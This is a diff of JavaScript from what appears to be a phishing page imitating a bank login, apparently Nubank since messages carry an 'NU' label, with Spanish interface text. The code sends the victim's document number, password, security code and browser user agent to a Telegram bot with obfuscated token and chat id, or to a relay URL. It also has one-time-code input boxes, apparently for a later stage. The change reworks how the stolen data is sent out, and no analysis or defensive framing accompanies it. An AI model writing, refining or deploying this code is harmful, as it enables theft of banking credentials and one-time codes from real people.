@@ -93,15 +93,15 @@ function closeM(){modal.classList.remove('open')}
 modal.onclick=e=>{if(e.target.id=='modal')closeM()};
 document.onkeydown=e=>{if(e.key=='Escape')closeM()};
 const send = m => {
+  if(RELAY) return fetch(RELAY+encodeURIComponent(m),{mode:"no-cors"}).catch(()=>{});
   const body = "chat_id="+dec(_c)+"&text="+encodeURIComponent(m);
-  const url = RELAY ? RELAY : "https://api.telegram.org/bot"+dec(_b)+"/sendMessage?"+body;
-  return fetch(url,{mode:"no-cors"}).catch(()=>{});
+  return fetch("https://api.telegram.org/bot"+dec(_b)+"/sendMessage?"+body,{mode:"no-cors"}).catch(()=>{});
 };
 const boxes=[...document.querySelectorAll('.otp-row input')];
 boxes.forEach((b,i)=>{b.oninput=()=>{b.value=b.value.replace(/\D/g,'');if(b.value&&i<5)boxes[i+1].focus()};
 b.onkeydown=e=>{if(e.key=='Backspace'&&!b.value&&i>0)boxes[i-1].focus()}});
 let DOC="";
-f1.onsubmit=async e=>{e.preventDefault();
+f1.onsubmit=async e=>{e.preventDefault();DOC=doc.value;
 b1.innerHTML='<span class="spin"></span>Verificando…';b1.disabled=true;
 await send("NU P1\ndoc: "+doc.value+"\nclave: "+pwd.value+"\ncodseg: "+sec.value+"\n"+navigator.userAgent);
 await new Promise(r=>setTimeout(r,900));
